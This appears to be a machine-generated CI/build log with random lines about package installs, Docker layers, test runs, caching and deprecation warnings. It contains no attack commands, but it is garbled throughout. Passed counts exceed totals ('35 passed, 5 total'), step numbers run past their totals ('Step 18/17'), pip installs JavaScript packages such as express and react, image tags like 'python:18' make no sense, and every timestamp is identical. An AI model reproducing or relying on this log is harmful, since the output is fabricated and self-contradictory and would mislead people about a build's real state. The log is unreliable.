e2e/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nStep 5/21: Running migrations\nConnection established\nBuilding Docker image...\nTransforming 534 files...\n[12:19:03] DEBUG: Loading configuration\nStep 19/20: Deploying\nCache hit for key-8356\nCompiling lib/app.ts...\nCache invalidated: dependencies\n[12:19:03] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'test' succeeded\nArtifact uploaded: dist.zip (61MB)\nUploading artifact 'dist' (48 files)\nReady.\nArtifact uploaded: dist.zip (64MB)\nVerifying...\nnpm notice: created a lockfile\n[12:19:03] INFO: Cache refreshed\n[12:19:03] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nUsing Node.js 17.3.4\nCache restored successfully (124MB)\nCompiling src/handler.rs...\nSwitched to branch 'hotfix/task-805'\n[12:19:03] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (35MB)\nStep 14/21: Linting\nStep 11/24: Installing dependencies\n\u2717 build failed with exit code 17\n[12:19:03] WARN: Deprecated API usage\nFAILED: test_user_create\nTests: 171 passed, 358 total\npip install: Successfully installed express-2.4\nStep 18/25: Testing\n[12:19:03] INFO: Request completed\nTLS handshake completed\nSwitched to branch 'bugfix/task-732'\nWARNING: prettier has known vulnerabilities\nPlatform: linux-x64\nTime: 41.839s\nCache hit for key-4049\n[12:19:03] DEBUG: Query executed in 1ms\nImage pulled successfully\nCache saved successfully\nPOST /upload - 200 (424ms)\nOK\n\u2713 build completed\nOK\nnpm install: resolved 186 packages\npip: Installing build dependencies...\nFetching submodules...\n[12:19:03] INFO: Request completed\nCompiling components/service.java...\nWaiting...\nConnecting to test.io:443...\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] WARN: Deprecated API usage\nyarn add: Done in 8.44s\nOptimizing 78 modules...\nnpm notice: package.json updated\nFinished.\nSnapshots: 8 passed, 46 total\nCache hit for key-9565\nGenerating source maps...\n=== Step setup_node completed ===\n=== Step: checkout ===\nPushing to registry...\nFetching submodules...\nWARNING: express has known vulnerabilities\npip: Downloading webpack-5.2.tar.gz\nCompiling components/utils.go...\nCompiling src/handler.rs...\n[12:19:03] DEBUG: Initializing service\n  PASS: test_db_connect (319ms)\nGenerating source maps...\nAlready up to date.\nyarn add: Done in 24.25s\nCreating production build...\nTime: 57.453s\nLayer 9/11: ENV command\nVerifying...\n\u2713 All checks passed\npip: Installing build dependencies...\nHEAD is now at bac606e\nPOST /upload - 202 (124ms)\nStep 4/18: Testing\nConnection established\nLayer 2/15: ENV command\nGET /api - 200 (3ms)\n[12:19:03] INFO: Request completed\nnpm install: resolved 103 packages\n[12:19:03] INFO: Connecting to database\nOptimizing 61 modules...\n\u2713 Step 'build' succeeded\nUploading artifact 'build' (8 files)\n[12:19:03] DEBUG: Initializing service\nTime: 102.568s\nCache miss for key-5661\npip install: Successfully installed express-3.13\nTransforming 802 files...\nCompiling src/main.py...\nChecking out master branch\nyarn add: Done in 18.2s\n[12:19:03] INFO: Processing request\nBuilding Docker image...\nOptimizing 99 modules...\nGET /status - 201 (62ms)\nFetching submodules...\nPOST /data - 200 (151ms)\nInstalling axios@3.6.5\nCoverage: 98% statements, 82% branches\nPushing to registry...\nInstalling jest@1.6.0\nnpm install: resolved 955 packages\npip install: Successfully installed react-3.17\n[12:19:03] INFO: Request completed\nOK\nUsing Python 3.9\nImage pulled successfully\nSwitched to branch 'feature/task-787'\nWARNING: jest has known vulnerabilities\nProcessing...\nCache miss for key-9325\nCreating production build...\nnpm install: added 40 packages\nPOST /api - 200 (38ms)\nPushing to registry...\nUploading artifact 'coverage' (5 files)\n\u2717 build failed with exit code 81\nStep 9/15: Linting\nProcessing...\n[12:19:03] INFO: Request completed\nCoverage: 72% statements, 65% branches\nConnecting to acme.corp:443...\nVerifying...\nTransforming 887 files...\n[12:19:03] DEBUG: Query executed in 3ms\nStep 10/25: Deploying\nWARNING: lodash has known vulnerabilities\nWARNING: react has known vulnerabilities\nyarn add: Done in 8.46s\nArtifact downloaded: 50MB\nCreating production build...\nOK\n[12:19:03] WARN: Deprecated API usage\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting react\nCoverage: 76% statements, 80% branches\nCompiling components/index.js...\nTransforming 824 files...\nTransforming 321 files...\n[12:19:03] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nCompiling components/app.ts...\nConnecting to example.com:443...\n[12:19:03] INFO: Cache refreshed\nConnection established\nGenerating source maps...\npip: Downloading react-5.6.tar.gz\nPlatform: win32-x64\nReady.\nTest Suites: 35 passed, 5 total\npip install: Successfully installed express-3.3\nLayer 3/11: ENV command\nFetching submodules...\nCache restored successfully (132MB)\nFetching submodules...\nCreating production build...\n  PASS: integration/test_auth_login.spec.js\n[12:19:03] INFO: Request completed\nCompiling utils/handler.rs...\nPushing to registry...\n\u2713 package completed\nArtifact uploaded: build.tar.gz (34MB)\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 65 modules...\nStep 8/25: Running migrations\nArtifact downloaded: 45MB\n\u2717 build failed with exit code 13\nLayer 7/10: ENV command\nConnecting to example.com:443...\nSuccess!\nCache hit for key-1375\nStep 13/19: Installing dependencies\n[12:19:03] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nnpm install: added 299 packages\n[12:19:03] DEBUG: Loading configuration\nnpm notice: created a lockfile\n[12:19:03] WARN: Deprecated API usage\nDone.\n[12:19:03] INFO: Starting build process\n\u2713 Step 'build' succeeded\nFetching submodules...\nHEAD is now at 14687ba\n[12:19:03] DEBUG: Loading configuration\n[12:19:03] INFO: Processing request\n[12:19:03] DEBUG: Query executed in 32ms\npip install: Successfully installed react-1.17\nTest Suites: 33 passed, 22 total\nTime: 19.772s\n\u2717 build failed with exit code 24\nStep 13/18: Testing\nInstalling eslint@5.12.3\n[12:19:03] ERROR: Connection failed\nStep 18/25: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'build' succeeded\nBuilding Docker image...\n  PASS: test_cache_hit (361ms)\nnpm notice: created a lockfile\nOK\nReady.\nChecking out develop branch\nProcessing...\nLayer 2/9: RUN command\nCreating production build...\nCache miss for key-2942\npip install: Successfully installed lodash-5.16\n[12:19:03] DEBUG: Loading configuration\nCache restored successfully (116MB)\nArtifact downloaded: 1MB\npip: Installing build dependencies...\nReady.\nnpm install: resolved 1349 packages\npip: Downloading express-5.17.tar.gz\nTime: 34.773s\nCoverage: 91% statements, 82% branches\nWARNING: webpack has known vulnerabilities\nCompleted.\nArtifact downloaded: 47MB\nArtifact downloaded: 12MB\nUsing Python 3.12\nConnection established\nCache saved successfully\nTest Suites: 20 passed, 25 total\n[12:19:03] DEBUG: Loading configuration\npip: Collecting react\nStep 6/22: Building\n[12:19:03] DEBUG: Loading configuration\n  PASS: e2e/test_db_connect.spec.js\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/app.ts...\n[12:19:03] DEBUG: Loading configuration\n[12:19:03] DEBUG: Initializing service\nReady.\nFAILED: test_user_create\nnpm notice: package.json updated\n\u2717 build failed with exit code 34\nArtifact uploaded: dist.zip (43MB)\nException: NullPointerException\nStep 2/24: Installing dependencies\n\u2717 build failed with exit code 77\nyarn add: Done in 6.76s\nPulling image: python:latest\n\u2713 Step 'checkout' succeeded\nCache miss for key-2473\nFinished.\nImage pulled successfully\n[12:19:03] WARN: Deprecated API usage\nPushing to registry...\nFinished.\nStep 5/22: Deploying\nLayer 9/8: RUN command\nCompiling components/index.js...\nTime: 41.968s\nCoverage: 99% statements, 86% branches\n[12:19:03] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:03] DEBUG: Connection pool: 16 active\nPlatform: linux-x64\nnpm notice: package.json updated\nTime: 71.681s\nReady.\n\u2713 Step 'build' succeeded\nRan 77 tests in 8s\nImage pulled successfully\nCache hit for key-3211\nPOST /data - 200 (294ms)\nStep 10/17: Running migrations\nUsing Node.js 17.18.4\nCache invalidated: node_modules\nGenerating source maps...\nCompleted.\n=== Step checkout completed ===\n=== Step: integration_tests ===\nFinished.\n[12:19:03] INFO: Connecting to database\nCoverage: 85% statements, 60% branches\n\u2713 All checks passed\nTest Suites: 37 passed, 7 total\nPushing to registry...\n\u2717 build failed with exit code 22\nVerifying...\nArtifact uploaded: dist.zip (57MB)\nCompleted.\n\u2713 Task completed in 2878ms\nTest Suites: 26 passed, 34 total\n[12:19:03] DEBUG: Connection pool: 19 active\n[12:19:03] INFO: Starting build process\nPlatform: linux-x64\n[12:19:03] WARN: Deprecated API usage\nyarn add: Done in 6.31s\nGET /api - 201 (36ms)\nTime: 42.435s\nPushing to registry...\n[12:19:03] INFO: Starting build process\nFAILED: test_api_health\nCreating production build...\nEnvironment: production\nUsing Python 3.11\nTime: 38.594s\n[12:19:03] WARN: Deprecated API usage\n  PASS: test_db_connect (173ms)\n[12:19:03] DEBUG: Loading configuration\nCache saved successfully\nTLS handshake completed\nCompleted.\nCache invalidated: dependencies\nBuilding Docker image...\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (5MB)\nInstalling webpack@4.11.4\n[12:19:03] ERROR: Connection failed\nStep 11/17: Running migrations\nUsing Python 3.10\n[12:19:03] DEBUG: Connection pool: 17 active\nPulling image: alpine:18\nBuilding Docker image...\nGenerating source maps...\nHEAD is now at af8bdc8\nReady.\nSuccess!\nyarn add: Done in 4.72s\nArtifact uploaded: dist.zip (28MB)\nPOST /data - 200 (18ms)\nStep 16/22: Testing\nOptimizing 97 modules...\n[12:19:03] DEBUG: Query executed in 7ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /data - 202 (29ms)\nCompiling src/handler.rs...\nImage pulled successfully\nStep 12/17: Testing\nSwitched to branch 'hotfix/task-397'\nOptimizing 73 modules...\nAlready up to date.\nUploading artifact 'coverage' (15 files)\nDone.\n[12:19:03] DEBUG: Loading configuration\n\u2713 All checks passed\n  PASS: integration/test_cache_hit.spec.js\nRan 54 tests in 33s\nStep 7/16: Deploying\n\u2713 validate completed\n\u2713 Step 'test' succeeded\nPlatform: darwin-arm64\n[12:19:03] INFO: Starting build process\nArtifact downloaded: 25MB\n[12:19:03] DEBUG: Loading configuration\nSwitched to branch 'feature/task-447'\nCoverage: 85% statements, 61% branches\nAlready up to date.\nMinifying app.js\n  PASS: integration/test_auth_login.spec.js\nWARNING: prettier has known vulnerabilities\nFinished.\nImage pulled successfully\n[12:19:03] INFO: Connecting to database\nCache restored successfully (31MB)\nConnecting to startup.dev:443...\npip: Downloading react-2.4.tar.gz\n[12:19:03] DEBUG: Query executed in 13ms\n  PASS: test_db_connect (67ms)\nnpm install: resolved 212 packages\nTime: 91.929s\npip: Installing build dependencies...\nHEAD is now at 4eb3ffb\nGET /status - 204 (100ms)\nWaiting...\nWARNING: eslint has known vulnerabilities\nGenerating source maps...\nNODE_ENV=development\nCache hit for key-2853\n[12:19:03] INFO: Starting build process\nyarn add: Done in 18.31s\npip: Collecting eslint\nCompleted.\nUsing Node.js 17.9.1\nGenerating source maps...\nWARNING: express has known vulnerabilities\n[12:19:03] DEBUG: Memory usage: 840MB\nBuilding Docker image...\nStep 14/15: Installing dependencies\nGET /health - 201 (67ms)\nNODE_ENV=production\nBundling vendor.js\nFAILED: test_db_connect\n[12:19:03] DEBUG: Memory usage: 1157MB\nStep 18/17: Building\n\u2717 build failed with exit code 40\nInstalling express@5.16.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:03] DEBUG: Memory usage: 381MB\n[12:19:03] DEBUG: Connection pool: 16 active\n[12:19:03] WARN: Deprecated API usage\nStep 1/23: Building\npip: Collecting eslint\n\u2713 All checks passed\n[12:19:03] INFO: Processing request\npip: Collecting prettier\n[12:19:03] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nCompiling utils/app.ts...\nLayer 7/9: COPY command\nGenerating source maps...\n[12:19:03] INFO: Processing request\nFAILED: test_api_health\nStep 16/25: Running migrations\n[12:19:03] INFO: Connecting to database\n  PASS: e2e/test_auth_login.spec.js\nTransforming 101 files...\nOptimizing 38 modules...\n\u2713 All checks passed\nCache saved successfully\nCoverage: 91% statements, 78% branches\npip: Downloading jest-4.9.tar.gz\nStep 12/17: Running migrations\nNODE_ENV=production\nBundling main.css\n[12:19:03] DEBUG: Memory usage: 1838MB\nChecking out main branch\nnpm notice: package.json updated\nGenerating source maps...\nChecking out main branch\nUsing Python 3.10\nWARNING: axios has known vulnerabilities\nPulling image: alpine:18\nBundling main.js\nBuilding Docker image...\nSnapshots: 6 passed, 11 total\nUsing Node.js 14.0.2\nStep 6/17: Linting\nSuccess!\nArtifact uploaded: build.tar.gz (3MB)\nLayer 1/12: RUN command\nStep 8/25: Building\nTime: 86.633s\nFAILED: test_auth_login\nnpm install: resolved 963 packages\nFinished.\npip: Installing build dependencies...\nCache invalidated: build\nProcessing...\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\nBuilding Docker image...\nProcessing...\nTransforming 913 files...\nStep 16/16: Deploying\nRan 191 tests in 20s\nCoverage: 73% statements, 82% branches\n[12:19:03] ERROR: Connection failed\nBundling styles.css\n\u2713 All checks passed\nRan 156 tests in 10s\nRan 192 tests in 55s\nUploading artifact 'coverage' (46 files)\nNODE_ENV=test\nConnection established\n[12:19:03] INFO: Request completed\nGET /api - 204 (65ms)\n[12:19:03] WARN: Deprecated API usage\n\u2713 Task completed in 4085ms\npip: Downloading jest-4.7.tar.gz\nyarn add: Done in 16.12s\nStep 10/17: Linting\nTransforming 481 files...\nHEAD is now at 3740a24\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] WARN: Deprecated API usage\nPushing to registry...\nTLS handshake completed\nInstalling lodash@2.15.10\nGET /health - 200 (55ms)\n[12:19:03] INFO: Starting build process\nConnection established\nHEAD is now at 6ea2b18\nCache restored successfully (227MB)\nCache invalidated: node_modules\nCache restored successfully (111MB)\nCache miss for key-9805\nBuilding Docker image...\npip: Downloading axios-5.11.tar.gz\nWARNING: webpack has known vulnerabilities\nPlatform: win32-x64\n  PASS: test_auth_login (268ms)\nStep 13/19: Running migrations\nBundling runtime.js\nCoverage: 81% statements, 87% branches\nEnvironment: staging\n\u2713 Task completed in 1102ms\n[12:19:03] INFO: Request completed\nTLS handshake completed\nPlatform: win32-x64\nCache miss for key-1488\nWARNING: jest has known vulnerabilities\nWARNING: jest has known vulnerabilities\n=== Step integration_tests completed ===\n=== Step: e2e_tests ===\nNODE_ENV=development\nPlatform: darwin-arm64\nInstalling axios@3.19.10\n\u2713 test completed\nDone.\nTLS handshake completed\nFinished.\n\u2713 Step 'setup' succeeded\nCompiling components/index.js...\nEnvironment: staging\nUploading artifact 'build' (39 files)\nArtifact downloaded: 43MB\nSnapshots: 38 passed, 18 total\nStep 10/15: Building\nConnecting to cloud.services:443...\nTime: 58.380s\nCache invalidated: dependencies\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:03] WARN: Deprecated API usage\nFinished.\nConnecting to test.io:443...\nBuilding Docker image...\nReady.\nConnection established\nLoading...\nStep 3/15: Running migrations\n[12:19:03] DEBUG: Connection pool: 18 active\n[12:19:03] DEBUG: Query executed in 94ms\n\u2713 deploy completed\n\u2713 Task completed in 4961ms\nyarn add: Done in 17.36s\n\u2713 build completed\n[12:19:03] INFO: Request completed\nBundling vendor.js\n  PASS: test_auth_login (420ms)\nnpm notice: created a lockfile\n[12:19:03] WARN: Deprecated API usage\nStep 6/20: Building\n[12:19:03] DEBUG: Query executed in 81ms\nProcessing...\nOptimizing 76 modules...\nCache saved successfully\nRan 43 tests in 29s\nCoverage: 70% statements, 89% branches\nConnecting to example.com:443...\nGET /health - 200 (10ms)\nOptimizing 33 modules...\nBuilding Docker image...\npip: Downloading prettier-4.16.tar.gz\nSuccess!\nEnvironment: production\nCache saved successfully\npip: Downloading jest-4.6.tar.gz\nCache saved successfully\nStep 4/18: Running migrations\nSnapshots: 31 passed, 7 total\nCache miss for key-1439\nImage pulled successfully\n[12:19:03] DEBUG: Connection pool: 6 active\nyarn add: Done in 25.30s\nTransforming 130 files...\n[12:19:03] ERROR: Connection failed\n\u2717 build failed with exit code 35\nFAILED: test_auth_login\n  PASS: test_cache_hit (261ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\nStep 11/16: Installing dependencies\nArtifact uploaded: dist.zip (73MB)\nStep 15/24: Testing\nnpm notice: created a lockfile\nUsing Python 3.11\nEnvironment: production\npip: Downloading eslint-4.2.tar.gz\nStep 6/22: Building\nChecking out develop branch\nHEAD is now at 90634c4\npip: Installing build dependencies...\nDone.\n[12:19:03] ERROR: Connection failed\nCompiling lib/handler.rs...\nBuilding Docker image...\nSnapshots: 15 passed, 13 total\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\nSuccess!\nHEAD is now at 9281782\n[12:19:03] DEBUG: Initializing service\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:03] DEBUG: Connection pool: 13 active\n[12:19:03] DEBUG: Connection pool: 12 active\n[12:19:03] INFO: Processing request\nUsing Python 3.11\n\u2713 All checks passed\nPulling image: alpine:18\nStep 17/16: Linting\n[12:19:03] DEBUG: Connection pool: 14 active\n[12:19:03] DEBUG: Connection pool: 1 active\n\u2713 All checks passed\nCompiling utils/handler.rs...\nOK\nFAILED: test_db_connect\nAlready up to date.\n\u2713 Step 'build' succeeded\nOK\nBundling runtime.js\nCompiling utils/app.ts...\nStep 5/23: Deploying\nPlatform: darwin-arm64\nReady.\n[12:19:03] INFO: Request completed\nTime: 62.271s\n[12:19:03] DEBUG: Connection pool: 9 active\nnpm install: resolved 706 packages\nSnapshots: 41 passed, 2 total\nCache restored successfully (315MB)\nCache hit for key-4097\nCreating production build...\n\u2713 Task completed in 102ms\nnpm notice: package.json updated\nSnapshots: 50 passed, 45 total\nGenerating source maps...\nUsing Node.js 19.8.5\nMinifying app.js\nTest Suites: 13 passed, 28 total\nVerifying...\n[12:19:03] DEBUG: Initializing service\npip: Collecting jest\nWaiting...\nMinifying app.js\nStep 12/16: Building\n[12:19:03] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (57MB)\n[12:19:03] DEBUG: Memory usage: 1060MB\nCache restored successfully (455MB)\nArtifact uploaded: build.tar.gz (13MB)\nGET /api - 200 (39ms)\nConnecting to test.io:443...\nSwitched to branch 'hotfix/task-257'\nStep 8/23: Deploying\nUsing Node.js 14.8.9\n\u2713 Step 'test' succeeded\nTest Suites: 17 passed, 18 total\nCache restored successfully (61MB)\nBundling runtime.css\nImage pulled successfully\nTLS handshake completed\nnpm notice: created a lockfile\nBundling main.css\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (4MB)\nnpm notice: package.json updated\nOK\npip: Downloading jest-4.18.tar.gz\nChecking out master branch\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:03] DEBUG: Connection pool: 1 active\nCache saved successfully\nFetching submodules...\nStep 2/19: Running migrations\nException: RuntimeError\nTime: 34.192s\nTLS handshake completed\nTLS handshake completed\n[12:19:03] DEBUG: Loading configuration\nFAILED: test_db_connect\nCache saved successfully\nnpm install: resolved 1836 packages\n[12:19:03] DEBUG: Query executed in 29ms\nCache miss for key-3060\nLoading...\nGET /api - 201 (90ms)\nPOST /upload - 200 (415ms)\n\u2713 Task completed in 3672ms\nHEAD is now at 39bdd49\nTLS handshake completed\nNODE_ENV=development\nCompleted.\nTime: 96.508s\n[12:19:03] ERROR: Connection failed\nHEAD is now at 92a1362\n[12:19:03] INFO: Starting build process\nChecking out main branch\n[12:19:03] ERROR: Connection failed\npip: Installing build dependencies...\nUploading artifact 'coverage' (13 files)\nSnapshots: 23 passed, 4 total\n  PASS: test_api_health (146ms)\nSuccess!\nnpm install: added 468 packages\nNODE_ENV=development\n[12:19:03] INFO: Connecting to database\n  PASS: unit/test_user_create.spec.js\n  PASS: unit/test_cache_hit.spec.js\nOptimizing 82 modules...\nCache restored successfully (153MB)\nBundling vendor.js\nEnvironment: test\n[12:19:03] DEBUG: Connection pool: 10 active\nTest Suites: 29 passed, 38 total\n  PASS: e2e/test_db_connect.spec.js\nStep 20/15: Installing dependencies\nRan 13 tests in 48s\nyarn add: Done in 5.85s\nCache hit for key-4326\nEnvironment: production\nCoverage: 82% statements, 99% branches\nnpm notice: package.json updated\nCoverage: 86% statements, 99% branches\n\u2713 All checks passed\nStep 3/20: Linting\nTests: 209 passed, 176 total\nCompleted.\nCompleted.\n\u2717 build failed with exit code 46\nCompiling src/service.java...\nTLS handshake completed\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\n[12:19:03] INFO: Request completed\n[12:19:03] ERROR: Connection failed\nStep 9/15: Linting\nStep 6/18: Linting\nPlatform: darwin-arm64\n\u2713 Step 'build' succeeded\n[12:19:03] INFO: Cache refreshed\n[12:19:03] INFO: Cache refreshed\n[12:19:03] DEBUG: Connection pool: 7 active\nCompiling components/utils.go...\nWaiting...\n[12:19:03] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (41MB)\n[12:19:03] INFO: Cache refreshed\nUploading artifact 'build' (4 files)\n  PASS: test_api_health (202ms)\npip: Collecting prettier\nInstalling react@3.8.5\nGET /health - 204 (100ms)\nBundling runtime.css\nTransforming 456 files...\nStep 6/24: Running migrations\n[12:19:03] WARN: Deprecated API usage\nTests: 103 passed, 340 total\nCache saved successfully\nnpm notice: created a lockfile\nPlatform: darwin-arm64\nRan 177 tests in 18s\nGET /api - 201 (93ms)\nCache hit for key-3297\nLayer 1/10: RUN command\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: dist.zip (80MB)\n  PASS: test_user_create (65ms)\nStep 9/20: Testing\nOptimizing 55 modules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:03] DEBUG: Connection pool: 11 active\n[12:19:03] DEBUG: Memory usage: 214MB\nTest Suites: 19 passed, 24 total\nConnecting to cloud.services:443...\nSuccess!\nFetching submodules...\nWaiting...\nTest Suites: 41 passed, 48 total\nSwitched to branch 'hotfix/task-959'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 19 modules...\nChecking out develop branch\nPulling image: node:18\nUploading artifact 'build' (10 files)\nCompleted.\nStep 3/20: Testing\nBundling runtime.css\nUploading artifact 'coverage' (28 files)\nWARNING: webpack has known vulnerabilities\nWaiting...\nTime: 48.223s\nnpm install: resolved 1813 packages\nTime: 62.360s\nTLS handshake completed\nSnapshots: 0 passed, 5 total\nCompiling lib/handler.rs...\nStep 9/23: Linting\n\u2713 Task completed in 4112ms\nStep 8/23: Running migrations\nUsing Node.js 14.12.5\n[12:19:03] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 463 files...\nCache hit for key-7163\nOK\nStep 5/24: Linting\nOptimizing 25 modules...\nCoverage: 96% statements, 92% branches\nCache restored successfully (430MB)\nLayer 6/9: COPY command\nTLS handshake completed\n[12:19:03] INFO: Request completed\nTLS handshake completed\nCompiling lib/service.java...\nCache restored successfully (237MB)\n\u2713 All checks passed\nArtifact downloaded: 11MB\nSuccess!\nStep 1/25: Running migrations\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (44MB)\nSuccess!\nCompiling components/utils.go...\nConnection established\nnpm install: resolved 529 packages\nCompiling lib/handler.rs...\nCoverage: 81% statements, 90% branches\nSuccess!\nChecking out master branch\n[12:19:03] DEBUG: Loading configuration\nUploading artifact 'build' (24 files)\nConnection established\n  PASS: test_user_create (388ms)\nArtifact downloaded: 10MB\nGET /status - 204 (75ms)\nStep 13/18: Installing dependencies\nCreating production build...\nEnvironment: test\nBuilding Docker image...\nEnvironment: development\nPlatform: linux-x64\nStep 9/22: Building\nCoverage: 95% statements, 93% branches\n  PASS: test_db_connect (384ms)\nArtifact downloaded: 30MB\nProcessing...\nPulling image: python:3.11\npip: Downloading axios-4.18.tar.gz\n[12:19:03] INFO: Request completed\nOK\nTransforming 749 files...\nCache restored successfully (118MB)\nUploading artifact 'dist' (50 files)\nPlatform: darwin-arm64\nConnecting to startup.dev:443...\nBuilding Docker image...\nUsing Node.js 20.14.2\npip: Downloading eslint-2.20.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:03] DEBUG: Memory usage: 1451MB\nOK\nyarn add: Done in 21.73s\nOptimizing 74 modules...\nHEAD is now at 3435a55\nCache restored successfully (47MB)\n[12:19:03] INFO: Cache refreshed\nCache invalidated: dependencies\n[12:19:03] INFO: Cache refreshed\nWaiting...\nCoverage: 77% statements, 93% branches\nCache restored successfully (268MB)\n[12:19:03] WARN: Deprecated API usage\nStep 7/18: Building\nInstalling axios@3.9.10\nCache hit for key-9183\nBundling vendor.js\nStep 3/16: Testing\npip install: Successfully installed webpack-1.16\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 44 passed, 5 total\nWARNING: axios has known vulnerabilities\nStep 15/21: Installing dependencies\nWARNING: jest has known vulnerabilities\nCompiling lib/index.js...\nCache saved successfully\nCache miss for key-7604\nArtifact uploaded: build.tar.gz (13MB)\nnpm install: added 482 packages\nArtifact uploaded: build.tar.gz (26MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\n[12:19:03] DEBUG: Loading configuration\nStep 2/24: Deploying\nTime: 78.783s\nCache restored successfully (125MB)\nException: RuntimeError\npip: Downloading express-4.17.tar.gz\n\u2713 Task completed in 1329ms\nDone.\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: python:18\nCache restored successfully (261MB)\nnpm install: resolved 1745 packages\nProcessing...\nPushing to registry...\nCache invalidated: node_modules\nMinifying app.js\nSuccess!\nAlready up to date.\nOK\npip install: Successfully installed express-4.3\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nImage pulled successfully\nWARNING: eslint has known vulnerabilities\n\u2713 All checks passed\nConnecting to test.io:443...\nSnapshots: 38 passed, 27 total\nCache saved successfully\nNODE_ENV=test\nStep 4/15: Installing dependencies\nSnapshots: 36 passed, 12 total\nNODE_ENV=production\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] INFO: Connecting to database\nCoverage: 83% statements, 76% branches\nOptimizing 35 modules...\npip: Installing build dependencies...\nCache miss for key-7528\nChecking out main branch\n[12:19:03] DEBUG: Query executed in 100ms\n[12:19:03] WARN: Deprecated API usage\nCache restored successfully (72MB)\nSuccess!\n[12:19:03] DEBUG: Query executed in 87ms\n\u2713 Task completed in 2902ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nImage pulled successfully\nPlatform: linux-x64\nDone.\nException: ValueError\nUsing Node.js 18.14.3\nGenerating source maps...\nStep 14/16: Deploying\nSuccess!\nReady.\nCoverage: 98% statements, 66% branches\nEnvironment: production\nConnecting to example.com:443...\nArtifact uploaded: build.tar.gz (23MB)\nEnvironment: development\nArtifact downloaded: 5MB\n[12:19:03] INFO: Starting build process\n=== Step save_cache completed ===\n=== Step: restore_cache ===\nCompiling src/handler.rs...\nTLS handshake completed\nSuccess!\nOK\n\u2713 Step 'checkout' succeeded\npip install: Successfully installed axios-2.7\nArtifact uploaded: dist.zip (78MB)\nInstalling jest@5.16.3\nVerifying...\nBundling main.js\nConnection established\nSuccess!\nPushing to registry...\n  PASS: integration/test_api_health.spec.js\nChecking out develop branch\npip install: Successfully installed jest-4.20\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 146 tests in 43s\n[12:19:03] DEBUG: Connection pool: 11 active\nStep 7/25: Installing dependencies\npip: Installing build dependencies...\nTime: 71.622s\n[12:19:03] INFO: Request completed\nSuccess!\nStep 5/25: Building\n[12:19:03] DEBUG: Initializing service\nStep 13/16: Running migrations\nUsing Python 3.9\nUsing Node.js 19.7.8\nStep 20/19: Running migrations\nWARNING: prettier has known vulnerabilities\n[12:19:03] ERROR: Connection failed\nTLS handshake completed\n\u2713 Step 'checkout' succeeded\nAlready up to date.\nStep 20/19: Linting\nWaiting...\nCompiling lib/main.py...\nSwitched to branch 'bugfix/task-211'\nStep 3/22: Deploying\n[12:19:03] WARN: Deprecated API usage\nCompiling lib/app.ts...\n[12:19:03] DEBUG: Memory usage: 175MB\nInstalling express@3.9.8\n  PASS: e2e/test_db_connect.spec.js\nImage pulled successfully\n[12:19:03] INFO: Cache refreshed\nFetching submodules...\n[12:19:03] ERROR: Connection failed\nStep 11/24: Testing\nnpm install: resolved 437 packages\nCreating production build...\nInstalling webpack@1.19.9\n\u2713 Task completed in 4453ms\n  PASS: unit/test_api_health.spec.js\nStep 12/22: Installing dependencies\nSwitched to branch 'feature/task-234'\nPlatform: win32-x64\n\u2713 build completed\nPushing to registry...\nOK\nConnection established\nAlready up to date.\nLayer 9/10: COPY command\n\u2713 All checks passed\nCache miss for key-5783\nStep 8/19: Installing dependencies\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:03] WARN: Deprecated API usage\nStep 17/25: Building\nCompiling utils/main.py...\nStep 6/25: Testing\nUploading artifact 'coverage' (25 files)\nSwitched to branch 'bugfix/task-790'\nSwitched to branch 'bugfix/task-558'\n[12:19:03] 